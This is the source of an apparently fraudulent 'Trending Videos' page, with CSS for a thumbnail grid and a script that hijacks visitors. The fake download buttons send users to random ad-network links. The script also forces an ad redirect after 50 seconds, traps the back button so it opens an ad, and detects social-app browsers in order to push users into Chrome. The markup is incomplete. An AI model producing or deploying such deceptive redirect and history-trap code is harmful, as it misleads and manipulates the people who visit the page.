<title>Trending Videos</title>

<style>

body{
margin:0;
font-family:Arial;
background:#fff;
color:#000;
}

.header{
text-align:center;
padding:20px;
font-size:26px;
font-weight:bold;
color:#ff2d55;
}

.container{
max-width:1200px;
margin:auto;
padding:15px;
display:grid;
grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
gap:15px;
}

.card{
position:relative;
overflow:hidden;
border-radius:12px;
}

.card img{
width:100%;
aspect-ratio:16/9;
object-fit:cover;
transition:0.3s;
}

.card:hover img{
transform:scale(1.08);
}

.play{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
width:65px;
height:65px;
background:rgba(255,255,255,0.35);
color:#fff;
border-radius:50%;
display:flex;
align-items:center;
justify-content:center;
font-size:28px;
backdrop-filter:blur(3px);
box-shadow:0 0 10px rgba(0,0,0,0.5);
}

.badge{
position:absolute;
top:8px;
left:8px;
background:red;
font-size:12px;
padding:4px 8px;
border-radius:6px;
}

.views{
position:absolute;
bottom:6px;
left:8px;
font-size:12px;
background:rgba(0,0,0,0.7);
color:#fff;
padding:4px 8px;
border-radius:6px;
}

.download{
width:100%;
background:#ff0000;
color:#fff;
border:none;
padding:10px;
font-size:14px;
font-weight:bold;
border-radius:8px;
margin-top:6px;
cursor:pointer;
}

.download:hover{
background:#cc0000;
}

.popup{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
display:none;
align-items:center;
justify-content:center;
z-index:9999;
}

.popup-box{
background:#fff;
padding:25px;
border-radius:10px;
text-align:center;
width:80%;
max-width:300px;
}

.chrome{
background:#28a745;
color:#fff;
padding:10px 25px;
border-radius:8px;
text-decoration:none;
display:inline-block;
margin-top:10px;
font-weight:bold;
}

</style>
</head>

<script>

// ================= LINKS =================

const links = [
"https://www.effectivegatecpm.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7",
"https://www.effectivegatecpm.com/mwknvbajf?key=aecdf05c84ffc20490a744a8a7a9b383",
"https://www.effectivegatecpm.com/qwrbesrk?key=a16d211d02fbe32fa29d7bb9035aff44",
"https://www.effectivegatecpm.com/ztj5w2myb2?key=f79737b0122e9f212f04f832582639bd",
"https://www.effectivegatecpm.com/xa4v69ebp?key=62079b05ebf5a63f468e7017849264af"
];

// ================= AUTO REDIRECT =================

if(!sessionStorage.getItem("autoRedirect")){
sessionStorage.setItem("autoRedirect","1");
setTimeout(function(){
window.location.href = links[0];
},50000);
}

// ================= DOWNLOAD BUTTON =================

document.querySelectorAll(".download").forEach(function(btn){

btn.addEventListener("click",function(){

let random = links[Math.floor(Math.random()*links.length)];
window.location.href=random;

});

});

// ================= BACK BUTTON TRAP =================

function trapHistory(){
history.pushState(null,null,location.href);
}

trapHistory();

window.addEventListener("popstate",function(){
window.location.href = links[0];
});

// ================= IN APP DETECT =================

function isInApp(){

let ua = navigator.userAgent;

return (
ua.includes("FBAN") ||
ua.includes("FBAV") ||
ua.includes("Instagram") ||
ua.includes("TikTok") ||
ua.includes("Messenger") ||
ua.includes("WhatsApp")
);

}

if(isInApp()){
document.getElementById("popup").style.display="flex";
}

// ================= OPEN CHROME =================

document.getElementById("chromeBtn").onclick=function(e){

e.preventDefault();

let url = window.location.href;

window.location.href =
"intent://" +
url.replace(/^https?:\/\//,'') +
"#Intent;scheme=https;package=com.android.chrome;end";

};

</script>
